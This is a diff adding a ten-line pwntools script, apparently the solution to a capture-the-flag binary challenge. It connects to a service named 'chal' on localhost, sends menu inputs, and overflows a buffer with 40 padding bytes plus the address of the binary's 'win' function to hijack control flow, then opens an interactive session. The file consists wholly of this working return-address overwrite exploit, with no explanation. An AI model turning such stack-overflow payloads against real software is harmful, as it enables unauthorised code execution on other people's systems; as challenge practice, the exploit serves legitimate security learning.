@@ -1,0 +1,10 @@
+from pwn import *
+elf = ELF("chal")
+p = remote("localhost", 8000) #process("./chal")
+p.clean()
+p.sendline(b"0")
+p.clean()
+p.sendline(b"A"*40 + p64(elf.sym["win"]))
+p.clean()
+p.sendline(b"1")
+p.interactive()
